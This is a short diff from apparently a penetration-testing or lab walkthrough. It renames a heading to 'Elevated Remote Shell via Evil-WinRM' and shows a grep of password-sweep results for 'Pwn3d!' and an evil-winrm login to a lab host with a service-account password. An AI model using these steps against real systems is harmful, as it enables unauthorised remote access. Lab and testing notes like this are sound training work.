@@ -77,7 +77,8 @@ cat pass_sweep | grep Pwn3d!
 
 ![image](https://github.com/user-attachments/assets/07e8b1b2-0e0b-412d-aa21-d1e12f0aa8fe)
 
-## Remote Shell via Evil-WinRM
+## Elevated Remote Shell via Evil-WinRM
+
 For targets with `WinRM` enabled:
 ```
 evil-winrm -i 10.10.X.10 -u svc_exchange  -p 1q2w3e4r
